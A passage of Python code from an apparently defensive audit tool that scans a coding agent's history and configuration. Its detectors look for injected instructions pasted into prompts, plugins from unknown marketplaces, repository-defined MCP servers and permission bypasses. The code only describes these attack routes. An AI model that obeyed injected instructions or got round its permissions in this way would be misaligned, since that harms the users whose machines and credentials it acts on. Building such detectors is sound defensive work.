    """Instruction-like content arriving through the prompt rather than through
    a file the agent read.

    `history.jsonl` is not swept by `cleanupPeriodDays`, so pasted text outlives
    the transcript that would show what the agent did with it. That is also why
    no consequence check is possible here the way it is for a file read: the
    other half of the chain may already be gone."""
    findings: list[Finding] = []
    for record in records:
        candidates = [("prompt", record.prompt)] + [
            (f"pasted:{item.type or 'unknown'}", item.content) for item in record.pasted
        ]
        for origin, text in candidates:
            markers = _injection_markers(text)
            if not markers:
                continue
            findings.append(
                Finding(
                    detector="pasted_injection",
                    severity="medium",
                    title=f"Instruction-like content entered through the {origin.split(':')[0]}",
                    detail=(
                        f"Matched {markers} in {origin}; prompt history is not swept by "
                        f"cleanupPeriodDays, so this survives its transcript"
                    ),
                    source="history.jsonl",
                    session_id=record.session_id,
                    timestamp=record.iso,
                    evidence={
                        "origin": origin,
                        "project": record.project,
                        "markers": markers,
                        "zero_width_present": bool(_ZERO_WIDTH.search(text)),
                        "excerpt": truncate(redact_value(text.strip(), redact_output), 500),
                        "session_id": record.session_id or "<not recorded>",
                    },
                )
            )
    return findings


def detect_supply_chain(
    servers: list[McpServer],
    plugins: list[InstalledPlugin],
    trust: list[ProjectTrust],
    reference_time: float = 0.0,
    recent_days: int = 7,
    redact_output: bool = True,
) -> list[Finding]:
    """Third-party components the agent runs with.

    Deliberately not reported: a server used in a transcript with no matching
    declaration. Measurement shows the host injects servers at runtime that
    appear in no configuration file, so that comparison flags ordinary desktop
    usage. It is reconciliation output rather than a finding."""
    findings: list[Finding] = []

    for plugin in plugins:
        if not plugin.marketplace_known:
            findings.append(
                Finding(
                    detector="supply_chain",
                    severity="high",
                    title="Plugin from an unregistered marketplace",
                    detail=(
                        f"{plugin.name} was installed from {plugin.marketplace!r}, which is absent "
                        f"from known_marketplaces.json"
                    ),
                    source=plugin.install_path or "plugins/installed_plugins.json",
                    timestamp=plugin.installed_at,
                    evidence={
                        "plugin": plugin.name,
                        "marketplace": plugin.marketplace,
                        "installed_at": plugin.installed_at,
                        "scope": plugin.scope,
                    },
                )
            )

        if not reference_time:
            continue
        arrival = max(parse_timestamp(plugin.installed_at), parse_timestamp(plugin.last_updated))
        if arrival and 0 <= (reference_time - arrival) <= recent_days * 86400:
            findings.append(
                Finding(
                    detector="supply_chain",
                    severity="medium",
                    title="Plugin introduced shortly before the activity collected here",
                    detail=(
                        f"{plugin.name} was installed or updated {(reference_time - arrival) / 86400:.1f} "
                        f"days before the newest activity in this collection"
                    ),
                    source=plugin.install_path or "plugins/installed_plugins.json",
                    timestamp=plugin.installed_at,
                    evidence={
                        "plugin": plugin.name,
                        "installed_at": plugin.installed_at,
                        "last_updated": plugin.last_updated,
                        "reference_time": format_timestamp(reference_time),
                    },
                )
            )

    trusted = {record.project for record in trust if record.trusted}
    for server in servers:
        if server.scope != "project":
            continue
        was_trusted = server.project in trusted
        findings.append(
            Finding(
                detector="supply_chain",
                severity="medium" if was_trusted else "low",
                title="MCP server defined by the repository",
                detail=(
                    f"{server.name} is declared in {server.source}, so the repository decides what "
                    f"tools the agent has"
                    + ("; the workspace is trusted, so it loads" if was_trusted else "; workspace not trusted")
                ),
                source=server.source,
                evidence={
                    "server": server.name,
                    "scope": server.scope,
                    "project": server.project,
                    "workspace_trusted": was_trusted,
                    "config": redact_value(server.config, redact_output),
                },
            )
        )
    return findings


def run_session_detectors(
    session: Session,
    redact_output: bool = True,
    stats: dict[str, int] | None = None,
    declared_hook_commands: set[str] | None = None,
) -> list[Finding]:
    return (
        detect_permission_bypass(session)
        + detect_credential_access(session, redact_output)
        + detect_injection_chain(session, redact_output, stats=stats)
        + detect_hook_execution(session, declared_hook_commands, redact_output)
    )
